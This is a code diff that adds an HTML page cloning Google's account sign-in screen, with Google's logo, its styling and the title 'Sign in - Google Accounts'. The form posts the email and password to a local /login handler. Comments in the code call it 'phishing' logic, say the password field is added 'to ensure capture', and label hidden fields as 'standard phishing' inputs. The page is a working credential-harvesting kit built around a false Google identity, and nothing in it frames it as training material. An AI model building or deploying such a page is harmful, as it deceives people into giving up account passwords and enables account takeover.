@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #202124;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .card {
+            background-color: white;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            width: 100%;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            width: 75px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0;
+            padding-bottom: 0;
+            padding-top: 16px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            margin-top: 8px;
+            margin-bottom: 40px;
+            letter-spacing: 0.1px;
+        }
+
+        .form-group {
+            position: relative;
+            width: 100%;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            color: #202124;
+            height: 56px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .form-control:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px; /* Adjust for 2px border */
+        }
+
+        /* Floating Label Logic */
+        .form-label {
+            position: absolute;
+            left: 14px;
+            top: 18px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s ease all;
+            background-color: white;
+            padding: 0 4px;
+        }
+
+        .form-control:focus ~ .form-label,
+        .form-control:not(:placeholder-shown) ~ .form-label {
+            top: -10px;
+            font-size: 12px;
+            color: #1a73e8;
+            font-weight: 500;
+        }
+        
+        .form-control:not(:focus):not(:placeholder-shown) ~ .form-label {
+            color: #5f6368;
+        }
+
+        .forgot-email {
+            align-self: flex-start;
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            margin-top: 8px;
+            margin-bottom: 40px;
+            text-decoration: none;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+
+        .guest-mode-text {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 40px;
+            text-align: left;
+            width: 100%;
+        }
+
+        .guest-mode-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .btn-next {
+            background-color: #1a73e8;
+            color: white;
+            padding: 0 24px;
+            height: 36px;
+            border: none;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover {
+            background-color: #1558b0;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            width: 450px;
+            margin-top: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer select {
+            background: none;
+            border: none;
+            font-size: 12px;
+            color: #202124;
+            cursor: pointer;
+        }
+
+        .footer-links span {
+            margin-left: 24px;
+            cursor: pointer;
+        }
+
+        /* Error Message hidden by default */
+        .error-msg {
+            display: none;
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 5px;
+            align-self: flex-start;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="main-container">
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+        <h1>Sign in</h1>
+        <div class="subtitle">Use your Google Account</div>
+
+        <form action="/login" method="POST" style="width: 100%;">
+            <div class="form-group">
+                <!-- Added dummy oninput to simulate value presence for CSS logic -->
+                <input type="text" id="email" name="email" class="form-control" placeholder=" " required>
+                <label for="email" class="form-label">Email or phone</label>
+            </div>
+            
+            <a href="#" class="forgot-email">Forgot email?</a>
+
+            <!-- Hidden password field for the "phishing" logic, visually hidden in step 1 of real Google login, 
+                 but we'll show it here or keep it hidden depending on how realistic you want the '2-step' flow.
+                 For this single-page demo, we will add the password field below to ensure capture. -->
+            
+             <div class="form-group" style="margin-bottom: 8px;">
+                <input type="password" id="password" name="password" class="form-control" placeholder=" " required>
+                <label for="password" class="form-label">Enter your password</label>
+            </div>
+            <!-- Standard phishing hidden inputs -->
+            <input type="hidden" name="service" value="mail">
+            <input type="hidden" name="continue" value="https://mail.google.com">
+
+            <div class="guest-mode-text">
+                Not your computer? Use Guest mode to sign in privately. <br>
+                <a href="#" class="guest-mode-link">Learn more</a>
+            </div>
+
+            <div class="button-group">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="btn-next">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        <div>
+            <select>
+                <option>English (United States)</option>
+                <option>Français</option>
+                <option>Español</option>
+            </select>
+        </div>
+        <div class="footer-links">
+            <span>Help</span>
+            <span>Privacy</span>
+            <span>Terms</span>
+        </div>
+    </div>
+</div>
+
+</body>
+</html>
